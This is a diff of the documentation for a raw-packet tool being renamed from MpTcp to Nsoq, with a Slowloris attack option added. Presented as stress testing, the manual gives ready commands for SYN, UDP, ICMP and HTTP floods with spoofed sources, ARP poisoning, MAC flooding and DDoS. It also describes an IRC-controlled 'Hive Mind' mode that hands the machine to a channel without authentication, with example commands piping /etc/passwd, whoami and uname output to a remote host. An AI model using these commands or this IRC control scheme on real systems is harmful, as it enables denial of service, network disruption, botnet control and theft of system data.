@@ -1,9 +1,9 @@
-                                   MpTcp
-                  TCP/IP Packet Manipulator and RSOI Handler
-          ______________________________________________________
+                                   Nsoq
+              Network Security over a 'Q'rawler and RSOI Handler
+          _________________________________________________________
 
                   Felipe Ecker (Khun) <khun@hexcodes.org> 
-                                2003 ~ 2013
+                                2003 ~ 2014
 
 
 
@@ -11,21 +11,22 @@
 DESCRIPTION:
 ____________
 
-   Mpctp is a tool for raw packets manipulation that allows a large number of
-   options. Its primary purpose is diagnose and test several scenarios that
-   involving the use of TCP/IP packets. It's capable to send packets to any
-   target type (like hostnames, IPs and MAC address) and manipulate many
-   fields and headers like: Source/Destination IP address,
-   Source/Destination MAC address, TCP flags, ICMP types, TCP/UDP/ICMP packet
-   size, payloads ARP/RARP, etc. 
+   Nsoq is a Network Security tool for raw packets manipulation that allows a
+   large number of options. Its primary purpose is analyze and test several 
+   scenarios of TCP/IP environments, such TCP/UDP packets and low levels 
+   ARP/RARP packets.
+   Nsoq can send packets to any target type (like hostnames, IPs and MAC 
+   address) like handling many fields/headers like: Source/Destination IP 
+   address, Source/Destination MAC address, TCP flags, ICMP types, 
+   TCP/UDP/ICMP packet size, payloads ARP/RARP, etc.
 
-   Mptcp is also able to be managed over the RSOI mode 
-   (Remote System over IRC), where the software can surrender all control and
-   machine resources to one channel on an remote IRC server. 
-   Also, too many types of network based attacks (like packet attacks) also
-   are handled by MpTcp.
+   Nsoq is able to operate into the RSOI mode (Remote System over IRC), where 
+   the tool can surrender all control of machine resources to some specific 
+   IRC channel, also called Hive Mind option.
 
-
+   Nsoq exeutes sistematically many types of network based attacks, like 
+   packet attacks, MAC/IP Spoofing, DoS/DDoS attacks, ARP Poison, MAC Flooding
+   and Web Stress Testing.
 
 
 ______________________________________________________________________________
@@ -35,8 +36,8 @@ SYNOPSIS:
 _________
 
 
-mptcp 
-   [-cbzDvuRAUCWBSK] 
+nsoq
+   [-cbzDvuRAUCWBSKY]
    [-d destination] [-s source] [-p port] [-P source_port] [-q number_packets]
    [-F delay] [-n number_threads] [-x buffer_size] [-t ttl] [Ie] [IE] [Id] [Iq]
    [Im] [-M mask] [lI] [Tc] [Ts] [Ta] Tf] [Tr] [Tp] [Tx] [Tn] [-lT <-P port>]
@@ -120,10 +121,11 @@ mptcp
 
    -U                  -->  UDP stress test
    -C                  -->  TCP connections stress test
-   -W                  -->  HTTP (GET request) stress test
+   -W                  -->  HTTP (GET/KEEPALIVE) stress test
    -B                  -->  ICMP stress test
-   -S                  -->  TCP SYN packets stress test
-   -K                  -->  TCP ACK packets stress test
+   -S                  -->  TCP SYN stress test
+   -K                  -->  TCP ACK stress test
+   -Y                  -->  SLOWLORIS based attack
    [INFO] Use the -p <port> to set other than port 80 (default as port 80)
 
    
@@ -149,7 +151,7 @@ ________
    
    -s <source>
       Source host (hostname or IP address). If -s <host> option is not
-      specified, the MpTcp assumes the IP address found by the first interface
+      specified, the Nsoq assumes the IP address found by the first interface
       defined in the system: (eth0, eth1, eth2, etc...) ordinarily.
    
    -p <port>
@@ -176,11 +178,11 @@ ________
       of 1 (one) second between the shoots.
 
    -F <delay>
-      Flood option. Set the time <delay> between the shoots (in microseconds).
+      Flood option. Sets the time <delay> between the shoots (in microseconds).
       The -F option cannot be used with -c or -b options.
 
    -b
-      Super flood. This option puts MpTcp optimized to send the largest number
+      Super flood. This option puts Nsoq optimized to send the largest number
       of packets in a short amount of time [CAUTION].
    
    -z
@@ -294,24 +296,24 @@ ________
    -H <destination mac>
       Destination MAC address. Option required for ARP packets. 
       This option requires a destination IP address. So if "-d <destination>"
-      is not given, MpTcp will assumes by default a NULL value on this field
+      is not given, Nsoq will assumes by default a NULL value on this field
       header. Form: -H AA:DD:CC:22:11:AA.
 
    -h <source mac>
       Source MAC address. This option requires the source IP address. If 
-      "-s <source>" is not given, MpTcp assumes by default the first IP
+      "-s <source>" is not given, Nsoq assumes by default the first IP
       address defined by the first interface found in the system (eth0, eth1,
       eth2, etc). Form: -h AA:DD:CC:22:11:AA.
    
    -R
       Defines the frame type like RARP packet. All ARP/RARP packets sent by
-      MpTcp on the link layer are ARP by default. If "-R" is defined, then
-      MpTcp send packets type RARP instead.
+      Nsoq on the link layer are ARP by default. If "-R" is defined, then
+      Nsoq send packets type RARP instead.
 
    -A
       Defines the ARP/RARP frame type like REQUEST packet. The packets sent by
-      MpTcp on the link layer are REPLY by default. If "-A" is defined, then
-      MpTcp sets the ARP/RARP packets to "REQUEST" type instead. 
+      Nsoq on the link layer are REPLY by default. If "-A" is defined, then
+      Nsoq sets the ARP/RARP packets to "REQUEST" type instead. 
    
    -a <ip address>
       Arping Mode. This option sends ARP REQUEST packets to a given IP 
@@ -322,9 +324,9 @@ ________
       Mac Flood (CAUTION !!).
       This option sends ARP REPLY packets with SOURCE MAC, DESTINATION MAC, 
       SOURCE IP ADDRESS and DESTINATION IP ADDRESS (randomly generated) on 
-      mode Super Food. If not specified the "-i <interface>" MpTcp takes the
+      mode Super Food. If not specified the "-i <interface>" Nsoq takes the
       first valid interface found in the System. Eg usage:
-                                # mptcp -f 120000
+                                # nsoq -f 120000
       This option does a flooding by sending 120000 packets with random IP 
       addresses and random MAC addresses. This attack is also called 
       MAC FLOODING. Note: 
@@ -333,12 +335,12 @@ ________
 
    -r <ip_address-ip_address>
       ARP Cannon (CAUTION !!).
-      This option sets MpTcp to send ARP REPLY packets to all defined IP 
+      This option sets Nsoq to send ARP REPLY packets to all defined IP 
       addresses inside the range "ip_address-ip_address". This packets will
       have destination MAC address defined to physical broadcast address 
       (FF:FF:FF:FF:FF:FF) and source MAC address randomly generated. The 
       option range (IP-IP) needs TO BE in the format shown below. Eg:   
-                        # mptcp -r 10.1.1.1-10.1.1.240
+                        # nsoq -r 10.1.1.1-10.1.1.240
       The above option does a flooding to destination physical broadcast 
       FF:FF:FF:FF:FF:FF, saying to network enlace that all IP adresses in the
       range "10.1.1.1 to 10.1.1.240" will have source MAC addresses randomly
@@ -349,7 +351,7 @@ ________
    -e <ip address>
       This option exclude the "ip address" from option ARP CANNON (-r ip-ip)
       above defined. Eg: 
-                  # mptcp -r 10.1.1.1-10.1.1.240 -e 10.1.1.10
+                  # nsoq -r 10.1.1.1-10.1.1.240 -e 10.1.1.10
       The above option will exclude the IP address "10.1.1.10" from 
       ARP CANNON attack.
 
@@ -363,7 +365,7 @@ ________
              <WEB Stress Test Options>
    -U
       UDP attack. 
-      Send UDP packets on flood mode to HTTP host (default: Port 80).
+      Sends UDP packets on flood mode to HTTP host (default: Port 80).
    
    -C
       TCP connections attack. 
@@ -371,21 +373,26 @@ ________
    
    -W
       WEB HTTP attack. 
-      Send HTTP requests (GET) on flood mode to HTTP host (default: Port 80).
+      Makes HTTP requests (GET) to host (default: Port 80).
    
    -B
       ICMP attack. 
-      Send ICMP packets on flood mode to HTTP host.
+      Sends ICMP packets on flood mode to HTTP host.
       (Also called Death Ping).
    
    -S
       TCP SYN attack. 
-      Send TCP SYN packets on flood mode to HTTP host (default: Port 80). 
+      Sends TCP SYN packets on flood mode to HTTP host (default: Port 80). 
       Also called SYN Flood attack.
    
    -K
       TCP ACK attack. 
-      Send TCP ACK packets on flood mode to HTTP host (default: Port 80).
+      Sends TCP ACK packets on flood mode to HTTP host (default: Port 80).
+
+   -Y
+      SLOWLORIS attack.
+      Makes partials HTTP requests (GET/KEEPALIVE) to host. (default Port 80).
+      
 
    INFO: Use the option -p <port> to set other port than 80.
    
@@ -398,17 +405,17 @@ ________
 
 
    -N <IRC server>
-      IRC network to connect. Option is required to put MpTcp on RSOI mode.
+      IRC network to connect. Option is required to put Nsoq on RSOI mode.
 
    -L <IRC channel>
       IRC #channel to connection. 
       The channel must be defined without "#" character, where only the 
-      "IRC channel" must be filled. If this option is not given, then MpTcp
-      will join on #mptcp channel by default. 
+      "IRC channel" must be filled. If this option is not given, then Nsoq
+      will join on #nsoq channel by default. 
    
    -G <password>
       IRC channel's password (if exists). If this option is not given, then
-      MpTcp will type the password's channel like "mptcp0" by default. 
+      Nsoq will type the password's channel like "nsoqpass" by default. 
    
    
    
@@ -420,90 +427,90 @@ EXAMPLES:
 _________
 
 
-   # mptcp -d hexcodes -Ie
+   # nsoq -d hexcodes -Ie
       Send an ICMP packet (Echo Request) to host "hexcodes".
 
-   # mptcp -lI
+   # nsoq -lI
       ICMP listen mode. Listen for ICMP packets like PINGs.
 
-   # mptcp -It -d www.hexcodes.org -c
+   # nsoq -It -d www.hexcodes.org -c
       Send ICMP packets (Timestamp Request) on continuous mode to server 
       "www.hexcodes.org".
 
-   # mptcp -s 10.1.100.100 -d www.hexcodes.org -u -p 4140
+   # nsoq -s 10.1.100.100 -d www.hexcodes.org -u -p 4140
       Send an empty UDP packet with spoofed source ip "10.1.100.100" to host
       "hexcodes" on port 4140.
 
-   # mptcp -d www.hexcodes.org -u -p 9000 -P 22000 -F 900 -q 20
+   # nsoq -d www.hexcodes.org -u -p 9000 -P 22000 -F 900 -q 20
       Send only 20 UDP packets to server "www.hexcodes.org" and to port 9000,
       from source port 22000 with flood Delay of 900 miliseconds.
 
-   # mptcp -d 201.1.0.13 -Ie -x 512 -t 50 -z
-      Set MpTcp for send ICMP packets (Echo Request) with size of 512 bytes 
+   # nsoq -d 201.1.0.13 -Ie -x 512 -t 50 -z
+      Sets Nsoq for send ICMP packets (Echo Request) with size of 512 bytes 
       to host "201.1.0.13" with TTL 50. Don't wait for ICMP Echo ReplY.
 
-   # mptcp -lU -P 59
+   # nsoq -lU -P 59
       Listen UDP packets on local port 59 (all addresses and loopback).
 
-   # mptcp -d hexcodes -Ts -p 6000
+   # nsoq -d hexcodes -Ts -p 6000
       Send a TCP SYN packet to host "hexcodes" on port 6000.
 
-   # mptcp -lC -P 12345 > file.txt
+   # nsoq -lC -P 12345 > file.txt
       Listen TCP connections on local port "12345", and write the received
       data on file 'file.txt'.
 
-   # mptcp -d hexcodes -p 12345 < /etc/hosts
+   # nsoq -d hexcodes -p 12345 < /etc/hosts
       Connect to host 'hexcodes' reading the file '/etc/hosts. The file
       content will be send over the TCP connection (netcat style).
    
-   # mptcp -lT -P 2134 -D
+   # nsoq -lT -P 2134 -D
       Listen for TCP packets on local port "2134" and show the packet content.
 
-   # mptcp -d www.hexcodes.org -Tr -p 8080 -n 12 -b
+   # nsoq -d www.hexcodes.org -Tr -p 8080 -n 12 -b
       Send TCP RST packets to server "www.hexcodes.org" on port 8080, with 12
       threads and super flood mode (HOT).
 
-   # mptcp -H FF:FF:FF:FF:FF:FF
+   # nsoq -H FF:FF:FF:FF:FF:FF
       Send an ARP REPLY packet to physical Broadcast FF:FF:FF:FF:FF:FF. (The
       source MAC address and the source IP address will be obtained locally 
       by the active interface. The destination IP address will be NULL).
 
-   # mptcp -i eth2 -h 00:BB:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF -d 10.1.10.1 -A
+   # nsoq -i eth2 -h 00:BB:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF -d 10.1.10.1 -A
       Send an ARP REQUEST packet by the eth2 interface with source MAC 
       00:BB:AA:CC:BB:AA, to destination physical Broadcast FF:FF:FF:FF:FF:FF,
       asking "Who ??" on the network have the IP address "10.1.10.1". The IP
       "10.1.10.1" (if alive) will respond with an ARP REPLY filled with its
       own MAC/IP address pair.
 
-   # mptcp -s 10.2.2.100 -h 00:CC:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF
+   # nsoq -s 10.2.2.100 -h 00:CC:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF
       Send an ARP REPLY packet to destination physical Broadcast 
       FF:FF:FF:FF:FF:FF saying that the source IP address "10.2.2.100" have
       now the MAC address 00:CC:AA:CC:BB:AA. (Caution: This option changes
       the ARP cache table. Possible ARP poisoning attack).
 
-   # mptcp -a 10.1.50.100
+   # nsoq -a 10.1.50.100
       Send an Arp'ing packet to Host "10.1.50.100". If the host hardware is
       alive on network or LAN, by default an ARP REPLY will be returned.
       Otherwise, nothing happens. This option can be used to bypass ICMP
       filters (PING filters).
 
-   # mptcp -f 250000
+   # nsoq -f 250000
       Send 250000 ARP REPLY packets (to physical broadcast) with the
       fields (SOURCE MAC, DESTINATION MAC, SOURCE IP and DESTINATION IP
       ADDRESSESS) randomly generated.
 
-   # mptcp -lA -D
+   # nsoq -lA -D
       Listen for ARP/RARP packets. Does a listen action for all incoming
       ARP/RARP packets on link layer, and show the packet content.
 
-   # mptcp -N irc.quakenet.org -L Cybers
-      Sets the MpTcp to connect on IRC Server "irc.quakenet.org" on channel
-      #Cybers. This option puts MpTcp on the RSOI mode. So, the MpTcp 
+   # nsoq -N irc.quakenet.org -L Cybers
+      Sets the Nsoq to connect on IRC Server "irc.quakenet.org" on channel
+      #Cybers. This option puts Nsoq on the RSOI mode. So, the Nsoq 
       will be NO AVAILABLE to be controled by user. Only the users on IRC
       server "irc.quakenet.org" channel #Cybers can do this.
 
-   # mptcp -d 10.0.0.1 -W -n 40
-      Sets the MpTcp to "WEB Stress Mode". This option puts MpTcp to send HTTP
+   # nsoq -d 10.0.0.1 -W -n 40
+      Sets the Nsoq to "WEB Stress Mode". This option puts Nsoq to send HTTP
       requests (GET method) on super flooding mode to host "10.0.0.1" on port
       80 (WEB HTTP) with 40 threads. This stress test attempts to exhaust the
       services on port 80 (Web Server) and check the target's limit response.
@@ -526,17 +533,17 @@ ____________
        Connections or packet manipulation to any port or destination
       ________________________________________________________________
 
-   MpTcp can connect or send packets to any destination or port. You can use 
+   Nsoq can connect or send packets to any destination or port. You can use 
    this option to diagnose a port (listening or not) or check if a host is
    responding as expected by sending many pre-builting packets. Eg:
 
-   # mptcp -d 10.0.0.2 -p 1024 -Tc
+   # nsoq -d 10.0.0.2 -p 1024 -Tc
       Does a simple TCP connection to host 10.0.0.2 on port 1024.
 
-   # mptcp -d 10.0.0.2 -p 20080 -u
+   # nsoq -d 10.0.0.2 -p 20080 -u
       Send an UDP packet to host 10.0.0.2 on port 20080.
 
-   # mptcp -d 10.0.0.2 -p 80 -Ts -c
+   # nsoq -d 10.0.0.2 -p 80 -Ts -c
       Send TCP SYN packets to host 10.0.0.2 on port 80. If the port is open,
       then a packet type TCP [ACK] will be returned. If this port is not 
       opened, usually a TCP [RST] packet is returned (port scan).
@@ -547,31 +554,31 @@ ____________
    Listen on any port (TCP and UDP) or listen for ICMP and ARP/RARP packets
    ________________________________________________________________________
 
-   MpTcp can listen on any port (UDP and TCP) or listen for ICMP or ARP/RARP
+   Nsoq can listen on any port (UDP and TCP) or listen for ICMP or ARP/RARP
    packets. This option can be used to simulate a listen port supposedly given
    by a software, and verify the connection requests or data incoming in this
-   same port. The MpTcp can does listen for incoming ICMP data like: pings,
+   same port. The Nsoq can does listen for incoming ICMP data like: pings,
    replies, source quenchs, etc. 
-   The MpTcp also does listen on link layer level, capturing ARP/RARP packets
+   The Nsoq also does listen on link layer level, capturing ARP/RARP packets
    (Requests and Replies).
 
-   # mptcp -lC -P 20
-      Sets mptcp to listen connections on local port 20 (TCP).
+   # nsoq -lC -P 20
+      Sets nsoq to listen connections on local port 20 (TCP).
 
-   # mptcp -lU -P 1030
-      Sets mptcp to listen on local port 1030 (UDP). 
+   # nsoq -lU -P 1030
+      Sets nsoq to listen on local port 1030 (UDP). 
 
-   # mptcp -lT -P 16 -s 10.0.0.1
-      Sets mptcp to listen on local port 16 (TCP packets) only binded on the
+   # nsoq -lT -P 16 -s 10.0.0.1
+      Sets nsoq to listen on local port 16 (TCP packets) only binded on the
       address "10.0.0.1".
 
-   # mptcp -lI -D
-      Sets mptcp to listen ICMP data and show the packet content. All incoming
+   # nsoq -lI -D
+      Sets nsoq to listen ICMP data and show the packet content. All incoming
       ICMP packets will be captured. This option is useful to display incoming
       pings.
 
-   # mptcp -lA
-   Sets mptcp to listen data on the link layer. This option will will capture
+   # nsoq -lA
+   Sets nsoq to listen data on the link layer. This option will will capture
    incoming ARP and RARP packets. This is useful to display ARP/RARP REQUESTS
    or REPLIES packets they cross the network.
 
@@ -580,18 +587,18 @@ ____________
                     Able to run like a FTP Connection
                    ___________________________________
 
-   MpTcp is capable to run like FTP (over TCP Connection). It can listen at
+   Nsoq is capable to run like FTP (over TCP Connection). It can listen at
    a given port, so reading/writing data on a send/received connection (like
    Netcat style). The data transfered can be BINARY or TEXT, whatever. Look:
    This mode is also compatible with Netcat modes (listeners and senders). 
 
                            (Server Side: On hexcodes host)
-   # mptcp -lC -P 2200 > hosts.txt
+   # nsoq -lC -P 2200 > hosts.txt
       Listen on local port 2200 and write the received data to file 
       'hosts.txt'.
 
                            (Client Side: From any host)
-   # cat /etc/hosts | mptcp -d hexcodes -Tc -p 2200
+   # cat /etc/hosts | nsoq -d hexcodes -Tc -p 2200
       Does a connection to host 'hexcodes', and reads the file '/etc/hosts', 
       to transfer the data content to remote host. The remote host 'hexcodes'
       will write the transfered data content on the hosts.txt file.
@@ -600,13 +607,13 @@ ____________
    Another example:
 
                            (Server Side: On hexcodes host)
-   # mptcp -lC -P 900 < files.zip
+   # nsoq -lC -P 900 < files.zip
      Listen on local port 900, and reads the binary content data of file
      'files.zip' to transfer on the next accepted connection.
 
                            (Client Side: From any host)
-   # mptcp -d hexcodes -Tc -p 900 > new_files.zip
-     Sets the MpTcp to connect the host 'hexcodes' on remote port 900, and
+   # nsoq -d hexcodes -Tc -p 900 > new_files.zip
+     Sets the Nsoq to connect the host 'hexcodes' on remote port 900, and
      read the binary incoming data content to write into the 'news_file.zip'
      file.
 
@@ -615,7 +622,7 @@ ____________
                            Arping - Alternative Ping
                            _________________________
 
-   MpTcp can send ARP REQUEST packets to certain destinations in order to
+   Nsoq can send ARP REQUEST packets to certain destinations in order to
    diagnose whether they are alive on the network. By default, the MAC
    interface of the host that receives an ARP REQUEST packet must return an
    ARP REPLY informing your MAC/IP pair. This option is very useful for
@@ -623,7 +630,7 @@ ____________
    packets and does  not accept pings ICMP. Therefore, the arping mode can be
    used to bypass the firewall that filter ICMP packets.
 
-   # mptcp -a 10.0.0.100
+   # nsoq -a 10.0.0.100
       Send an ARP'ING to host "10.0.0.100". If the host is alive on
       network, then it will respond with an ARP REPLY packet.
 
@@ -641,15 +648,15 @@ ____________
                     DOS and DDoS based attacks (over Web Stress)
                     ____________________________________________
 
-   Since version 1.7, the mptcp enabled stress test of network based attacks.
+   Since version 1.7, the nsoq enabled stress test of network based attacks.
    These attacks are able to attempt to exhaust the services on port 80 
-   (Web Server) and verify the target's limit. If many clients of MpTcp run 
+   (Web Server) and verify the target's limit. If many clients of Nsoq run 
    these routines at the same time and targeted to a single server, then this
    server may fail in their services or become unavailable while the attack
    lasts (DDoS). Eg:
 
-   # mptcp -d www.hexcodes.org -W -n 20
-     Sets the mptcp to "Stress Test mode", where the MpTcp will send many 
+   # nsoq -d www.hexcodes.org -W -n 20
+     Sets the nsoq to "Stress Test mode", where the Nsoq will send many 
      shootings on super flooding mode to server "www.hexcodes.org" on port 80
      (Default WEB Service), and with 20 threads. This option will give a great
      overhead on target where it will try to exhaust the services WEB based. 
@@ -664,27 +671,27 @@ ____________
                              Mac and IP Spoofing
                              ___________________
 
-   MpTcp can send packets with Source IP address and Source MAC address
-   spoofed. MpTcp can generate ICMP, TCP (syn, ack, rst, fin, push, null bits
+   Nsoq can send packets with Source IP address and Source MAC address
+   spoofed. Nsoq can generate ICMP, TCP (syn, ack, rst, fin, push, null bits
    and xmas bits on), UDP packets and ARP/RARP (Request and replies) with
    source IP address filleds to any value. It can also set any value in the
    source MAC address. Eg:
 
-   # mptcp -d 10.0.0.10 -p 890 -Ts -s 10.1.10.10
+   # nsoq -d 10.0.0.10 -p 890 -Ts -s 10.1.10.10
       Send a TCP packet (bit syn on) to address "10.0.0.10" on port 890 and
       with source IP address defined (spoofed) to "10.1.10.10".
 
-   # mptcp -s 0.0.0.0 -d 10.0.0.10 -p 9000 -u -c 
+   # nsoq -s 0.0.0.0 -d 10.0.0.10 -p 9000 -u -c 
       Send UDP packets to address "10.0.0.10" on port 9000 and with source
       IP address defined to NULL "0.0.0.0".
 
-   # mptcp -d 10.0.0.1 -Ie -z -F 1000 -s 10.255.0.255
+   # nsoq -d 10.0.0.1 -Ie -z -F 1000 -s 10.255.0.255
       Send ICMP packets (Echo Request - PING) to address "10.0.0.10" with
       Source IP address defined to "10.255.0.255". This shoot don't wait by
       the Echo Reply (-z option) and does a flooding with a delay time of 1000
       microseconds (-F option).
 
-   # mptcp -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00
+   # nsoq -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00
       Send an ARP REPLY packet to physical BROADCAST (FF:FF:FF:FF:FF:FF)
       saying that your source IP address have now MAC address
       00:00:00:00:00:00. On this option, the sender host will stop receiving
@@ -697,7 +704,7 @@ ____________
                                 Massive Flood
                                 _____________
 
-   MpTcp can send any of its options (ICMP, TCP, UDP, and ARP-RARP) with
+   Nsoq can send any of its options (ICMP, TCP, UDP, and ARP-RARP) with
    "Flood Delay" or "Super Flood" modes. The Flood Delay option sets the
    interval of shoots in microseconds, and can send packets in a very low range
    of time. The "Super Flood" is more hard because it ignores the packet reply
@@ -707,20 +714,20 @@ ____________
    they may cause unavailability of the target's services or the complete
    unavailability of the network's target.
 
-   # mptcp -d www.hexcodes.org -Ie -b
+   # nsoq -d www.hexcodes.org -Ie -b
       Send ICMP packets type Echo Request (PING) to server "www.hexcodes.org"
       on super flood mode.
 
-   # mptcp -d 10.0.0.10 -p 900 -u -b -x 1300
+   # nsoq -d 10.0.0.10 -p 900 -u -b -x 1300
       Send UDP packets (super flood mode) to host "10.0.0.10" on port 900 with
       packet size of 1300 bytes. 
 
-   # mptcp -d 10.0.0.10 -Iq -F 10
+   # nsoq -d 10.0.0.10 -Iq -F 10
       Send ICMP packets (Source Quench type) to host "10.0.0.10" and with flood
       delay of 10 microseconds. This packet type can decrease the flow of
       receiver.
 
-   # mptcp -d 10.0.0.10 -s 10.0.0.0 -p 80 -Ts -F 1 -z
+   # nsoq -d 10.0.0.10 -s 10.0.0.0 -p 80 -Ts -F 1 -z
       Send TCP SYN packets to host on port 80, with source IP address defined
       to "10.0.0.0" and with flood delay of 1 microsecond. This option don't 
       wait for replies. This attack is also named "Syn Flood (spoofed)".
@@ -731,8 +738,8 @@ ____________
                                ARP Poisoning
                                _____________
    
-   MpTcp send packets at the link layer and previously can define the source
-   and destination MAC addresses. MpTcp can manipulate the source MAC address
+   Nsoq send packets at the link layer and previously can define the source
+   and destination MAC addresses. Nsoq can manipulate the source MAC address
    and the source IP address, so can change the ARP cache table of neighbors
    on the network, causing a DoS or a pre-manipulation of data forwarding to
    others destinations. A characterization of this kind of action is known as
@@ -740,13 +747,13 @@ ____________
    neighbors, making them believe they are sending to gateway, where the
    gateway will be the poisoning sender.
 
-   # mptcp -H FF:FF:FF:FF:FF:FF -s 10.0.0.1 -h AA:BB:CC:DD:EE:FF 
+   # nsoq -H FF:FF:FF:FF:FF:FF -s 10.0.0.1 -h AA:BB:CC:DD:EE:FF 
       Send an ARP REPLY packet to physical BROADCAST saying that the
       source IP address "10.0.0.1" have now MAC address AA:BB:CC:DD:EE:FF. If
       the address "10.0.0.1" is alive on the network, then it will be
       unavaiable for minutes on state of offline for physical comunication.
 
-   # mptcp -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00 -s 10.0.0.1 -i eth0 -c
+   # nsoq -H FF:FF:FF:FF:FF:FF -h 00:00:00:00:00:00 -s 10.0.0.1 -i eth0 -c
       Send successively ARP REPLY packets to physical BROADCAST by the eth0
       interface, and saying that source host "10.0.0.1" have now the MAC
       address 00:00:00:00:00:00. This option leave the host "10.0.0.1" offline
@@ -758,9 +765,9 @@ ____________
       MAC Flooding - Buffer overflow on the Switch's ARP Table (CAM TABLE)
       ____________________________________________________________________
 
-   MpTcp brings the specific option of ARP Flood (MAC FLOODING). This option is
+   Nsoq brings the specific option of ARP Flood (MAC FLOODING). This option is
    controversial, but may well be used for multiple purposes. The option 
-   "-f <num packets>" of MpTcp sends <num packets> to physical BROADCAST with
+   "-f <num packets>" of Nsoq sends <num packets> to physical BROADCAST with
    Source and Destination MAC addresses randomly generated, and Source and
    Destination IP addresses randomly generated. The intent of this type of
    transmission is overloading the temporary ARP cache table that the switches
@@ -770,8 +777,8 @@ ____________
    ports on device (HUB mode), facilitating a process of sniffer NO-UNICAST
    of any host on the network.
 
-   # mptcp -f 140000
-      Sets mptcp to send 140000 ARP REPLY packets to physical BROADCAST with
+   # nsoq -f 140000
+      Sets nsoq to send 140000 ARP REPLY packets to physical BROADCAST with
       source and destination MAC address, source and destination IP address
       generated randomly. If the memory buffer of the switch (CAM Table) is
       less than 140000, then the switch will enter on "Fail Open mode".
@@ -788,16 +795,16 @@ ____________
                        RSOI - Remote System over IRC 
 
 
-   Since version 1.7, MpTcp enabled the RSOI (Hive Mind) option for external
+   Since version 1.7, Nsoq enabled the RSOI (Hive Mind) option for external
    use. This control is managed by an IRC channel, where a central controller
    through commands given on the arbitrary channel of an IRC server can
-   remotely control all the clients (MpTcp) connected to this channel. This
-   option can only be used through an IRC network, cause MpTcp was developed
+   remotely control all the clients (Nsoq) connected to this channel. This
+   option can only be used through an IRC network, cause Nsoq was developed
    waiting a communication over an IRC protocol.
 
    Inside this option, the user no more have control over the tool, giving all
    and all control to IRC #channel. In other words, using RSOI mode you
-   surrender control of MpTcp and ALL SELF MACHINE to all on IRC #channel, who
+   surrender control of Nsoq and ALL SELF MACHINE to all on IRC #channel, who
    can manipulate it and use all local resources of host without any
    authentication. 
 
@@ -808,7 +815,7 @@ ____________
    Otherwise, is useful (for example) for:
 
    -> To Check the limit link of remote host, where a controller may join many
-   users at a channel, and then with a single shoot to make all the MPTCPs
+   users at a channel, and then with a single shoot to make all the NSOQs
    clients at same time responding to this command, triggering packets to a
    specific target and checking the loading limitations. 
 
@@ -818,73 +825,73 @@ ____________
 
    Example:
 
-                        # mptcp -N irc.quakenet.org
-      (If no channel is giving, default #mptcp channel is used)
-      (If no password is giving, default mptcp0 channel's password is used)
+                        # nsoq -N irc.quakenet.org
+      (If no channel is giving, default #nsoq channel is used)
+      (If no password is giving, default 'nsoqpass' channel's password is used)
 
 
-   - The option above sets MpTcp to enter on IRC Server "irc.quakenet.com" on
-   channel #mptcp (default). After action, mptcp will NOT accept any command
-   from user, where MpTcp only will responds to commands that arrive from 
-   "irc.quakenet.org" on #mptcp. If many MpTcp clients are on channel in
-   this moment, then the general controller will be able to control all MPTCPs
-   clients by your self command. Absolutely, all MpTcp will respond to it.
+   - The option above sets Nsoq to enter on IRC Server "irc.quakenet.com" on
+   channel #nsoq (default). After action, Nsoq will NOT accept any command
+   from user, where Nsoq only will responds to commands that arrive from 
+   "irc.quakenet.org" on #nsoq. If many Nsoq clients are on channel in
+   this moment, so the general controller will be able to control all NSOQs
+   clients by your self command. Absolutely, all Nsoq will respond to it.
 
 
-                 # mptcp -N irc.quakenet.org -L Cybers
-              (#Cybers channel defined on MpTcp connection)
+                 # nsoq -N irc.quakenet.org -L Cybers
+              (#Cybers channel defined on Nsoq connection)
 
                                 (or)
 
-            # mptcp -N irc.quakenet.org -L Cybers -G pass
-     (Password "pass" defined to #Cybers channel on MpTcp connection)
+            # nsoq -N irc.quakenet.org -L Cybers -G pass
+     (Password "pass" defined to #Cybers channel on Nsoq connection)
 
    
 
-   After connected to IRC, the channel can send commands to ALL MpTcp clients.
+   After connected to IRC, the channel can send commands to ALL Nsoq clients.
    These commands need be a specific syntax to differentiate it from normal
-   text typed on channel. MpTcp only understand commands prefixed by syntax:
+   text typed on channel. Nsoq only understand commands prefixed by syntax:
    
    @!~<space>
    
-   Ie, everything that comes after this syntax will say to all MpTcp clients to
+   Ie, everything that comes after this syntax will say to all Nsoq clients to
    see this like an execution command.
    Example:
 
 
-   @!~ mptcp -d hexcodes.org -Ie
-       That says to ALL MpTcp clients connected on the channel to send an ICMP
+   @!~ nsoq -d hexcodes.org -Ie
+       That says to ALL Nsoq clients connected on the channel to send an ICMP
        Echo Request (Ping) to "www.hexcoees.org" server. 
 
 
    Another example. Sounds like a blind query:
 
    @!~ cat /etc/hosts
-       This command (sent by the #channel) tells to all MpTcp clients run the
+       This command (sent by the #channel) tells to all Nsoq clients run the
        "cat" command on /etc/passwd file. 
        The result WILL BE NOT SHOWED on IRC channel.
 
 
    One more example, and SO MUCH MORE DANGEROUS ( ...):
 
-          @!~ cat /etc/passwd | mptcp -d hexcodes.org -Tc -p 123
+          @!~ cat /etc/passwd | nsoq -d hexcodes.org -Tc -p 123
 
-   This command (sent by the #channel) tells to all MpTcp clients run a
+   This command (sent by the #channel) tells to all Nsoq clients run a
    "cat" command on /etc/passwd file and send result to remote host 
-   'hexcodes'. If the 'hexcodes' host is listening on port 123 with MpTcp or
+   'hexcodes'. If the 'hexcodes' host is listening on port 123 with Nsoq or
    Netcat (ie), the content of /etc/passwd file will be transfered.
 
    Conclusion:
    So, we don't need spawn a shell, cause we already have one dedicated shell
    under RSOI mode across the IRC channel.
 
-          @!~ ls -al /etc | mptcp -d hexcodes.org -Tc -p 123
+          @!~ ls -al /etc | nsoq -d hexcodes.org -Tc -p 123
 
-          @!~ whoami | mptcp -d hexcodes.org -Tc -p 123
+          @!~ whoami | nsoq -d hexcodes.org -Tc -p 123
 
-          @!~ uname -a | mptcp -d hexcodes.org -Tc -p 123
+          @!~ uname -a | nsoq -d hexcodes.org -Tc -p 123
 
-          @!~ grep root /etc/passwd | mptcp -d hexcodes.org -Tc -p 123
+          @!~ grep root /etc/passwd | nsoq -d hexcodes.org -Tc -p 123
 
 
 ______________________________________________________________________________
@@ -892,9 +899,9 @@ ______________________________________________________________________________
 SECURITY:
 _________
 
